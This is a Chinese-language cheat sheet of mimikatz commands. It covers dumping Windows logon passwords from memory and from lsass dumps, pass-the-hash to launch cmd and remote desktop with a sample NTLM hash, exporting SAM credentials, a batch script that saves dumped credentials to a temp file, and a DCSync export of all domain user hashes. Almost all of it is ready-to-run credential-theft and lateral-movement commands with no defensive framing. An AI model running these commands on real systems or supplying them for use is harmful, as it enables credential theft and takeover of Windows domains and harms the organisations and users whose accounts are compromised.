# mimikatz

官方 Github：https://github.com/gentilkiwi/mimikatz

## 获取登录凭证信息

```
mimikatz.exe log "privilege::debug" "sekurlsa::logonpasswords" exit
```

```
privilege::debug
sekurlsa::logonpasswords
```

## lsass.exe 导出凭据

```
mimikatz.exe log "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
```

## mimikatz PTH 传递 cmd

```
mimikatz "privilege::debug" "sekurlsa::pth /user:Administrator /domain:WIN-9UUCAGH32BT /ntlm:f33dfac0370b09935d0037d8333caf25 /run:cmd.exe" "exit"
```

## mimikatz PTH 传递 mstsc

```
mimikatz "privilege::debug"  "sekurlsa::pth /user:Administrator /domain:WIN-9UUCAGH32BT /ntlm:f33dfac0370b09935d0037d8333caf25 /run:mstsc.exe /restrictedadmin" "exit"
```

```
privilege::debug
sekurlsa::pth /user:Administrator /domain:WIN-9UUCAGH32BT /ntlm:f33dfac0370b09935d0037d8333caf25 "/run:mstsc.exe /restrictedadmin"
```

## SAM 数据库导出凭据

```
mimikatz "log" "lsadump::sam /sam:sam.hive /system:system.hive"  "exit"
```


## bat 脚本获取凭据

```
@echo off
cd /d D:\tools\
mimikatz.exe privilege::debug sekurlsa::logonpasswords exit > C:\windows\temp\log.txt
```

## 导出域内所有用户hash

```
mimikatz.exe "lsadump::dcsync /domain:test.com /all /csv" exit
```